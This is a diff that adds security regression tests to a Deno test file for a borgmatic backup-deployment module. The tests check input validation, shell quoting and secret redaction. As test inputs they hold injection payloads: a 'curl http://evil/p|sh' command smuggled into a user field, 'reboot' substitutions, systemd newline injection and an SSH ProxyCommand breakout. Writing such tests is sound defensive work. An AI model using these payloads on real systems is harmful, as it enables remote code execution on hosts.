@@ -3,7 +3,13 @@
  * rendering, script building, output parsing) plus every method wired against an
  * injected TargetRunner seam. No live host is ever touched.
  */
-import { assertEquals, assertMatch, assertRejects } from "jsr:@std/assert@1";
+import {
+  assertEquals,
+  assertMatch,
+  assertNotMatch,
+  assertRejects,
+  assertThrows,
+} from "jsr:@std/assert@1";
 import {
   base64ToStr,
   borgTimeToMs,
@@ -19,6 +25,7 @@ import {
   parseBorgmaticVersion,
   parseMarkers,
   redactConfig,
+  redactPassphraseLeaks,
   remoteShellArgv,
   renderBorgmaticConfig,
   shQuote,
@@ -27,6 +34,12 @@ import {
   type TargetRunner,
   usesCommandsSyntax,
 } from "./borgmatic.ts";
+
+// Schema handle for validation-rejection tests (globalArguments IS the zod schema).
+// deno-lint-ignore no-explicit-any
+const GARGS = (model as any).globalArguments as {
+  parse: (o: unknown) => unknown;
+};
 
 // --- test doubles -----------------------------------------------------------
 
@@ -647,4 +660,87 @@ Deno.test("model shape: type, verbs, reachable check coverage", () => {
     model.checks.reachable.appliesTo.includes("backup"),
     true,
   );
+});
+
+// --- security regression tests (adversarial review 2026-08-07) --------------
+
+Deno.test("SEC-1: schema rejects injection in ssh/sudo/systemd/path fields", () => {
+  // becomeUser / sshUser are spliced into ssh trailing args → remote shell.
+  assertThrows(() =>
+    GARGS.parse({ host: "h", becomeUser: "x; curl http://evil/p|sh #" })
+  );
+  assertThrows(() => GARGS.parse({ host: "h", sshUser: "root; reboot" }));
+  // onCalendar / randomizedDelay land in a systemd drop-in (newline injection).
+  assertThrows(() =>
+    GARGS.parse({
+      host: "h",
+      schedule: { onCalendar: "daily\n[Timer]\nUnit=x" },
+    })
+  );
+  assertThrows(() =>
+    GARGS.parse({
+      host: "h",
+      schedule: { randomizedDelay: "3h\nPersistent=x" },
+    })
+  );
+  // configDir with shell metacharacters.
+  assertThrows(() => GARGS.parse({ host: "h", configDir: "/etc/$(reboot)" }));
+});
+
+Deno.test("SEC-1: schema accepts legitimate values", () => {
+  const ok = GARGS.parse({
+    host: "192.0.2.20",
+    sshUser: "deploy",
+    become: true,
+    becomeUser: "backup-svc",
+    configDir: "/etc/borgmatic",
+    schedule: {
+      onCalendar: "*-*-* 02:00:00",
+      randomizedDelay: "3h",
+      persistent: true,
+    },
+  }) as GlobalArgs;
+  assertEquals(ok.becomeUser, "backup-svc");
+  assertEquals(ok.sshUser, "deploy");
+});
+
+Deno.test("SEC-2: crafted sshKeyPath cannot inject ssh_command options", () => {
+  // Attempt to break out of `ssh -i '<path>'` into an extra -o ProxyCommand.
+  const evil = "id_rsa' -o ProxyCommand='touch /tmp/pwned";
+  const out = renderBorgmaticConfig({ ...baseCfg, sshKeyPath: evil }, V19);
+  const line = out.split("\n").find((l) => l.startsWith("ssh_command:"))!;
+  // The embedded ' is shQuote-escaped (yamlDq then doubles the backslash), so
+  // borg's shlex.split sees the whole payload as ONE inert -i value.
+  assertMatch(line, /-i 'id_rsa'\\\\'' -o ProxyCommand=/); // escaped, quoted
+  // The vulnerable raw-interpolation render would instead close the quote and
+  // expose a bare ` -o ProxyCommand` option — assert that never happens.
+  assertNotMatch(line, /-i 'id_rsa' -o ProxyCommand/);
+});
+
+Deno.test("SEC-3: DB hook password is redacted from the persisted config", () => {
+  const cfg: GlobalArgs = {
+    ...baseCfg,
+    hooks: {
+      databases: [
+        {
+          type: "postgresql",
+          name: "app",
+          username: "app",
+          password: "S3cretDbPw!",
+        },
+      ],
+    },
+  };
+  const red = redactConfig(renderBorgmaticConfig(cfg, V20));
+  assertNotMatch(red, /S3cretDbPw!/);
+  assertMatch(red, /password: "<redacted>"/);
+});
+
+Deno.test("SEC-4: redactPassphraseLeaks handles escaped quotes with no tail leak", () => {
+  // yamlDq renders a passphrase containing " as \" — a quote-delimited regex
+  // would stop at the fake boundary and leak the tail.
+  const leaked = 'encryption_passphrase: "ab\\"cd-SECRETTAIL"';
+  const red = redactPassphraseLeaks(leaked);
+  assertNotMatch(red, /SECRETTAIL/);
+  assertMatch(red, /encryption_passphrase: <redacted>/);
 });
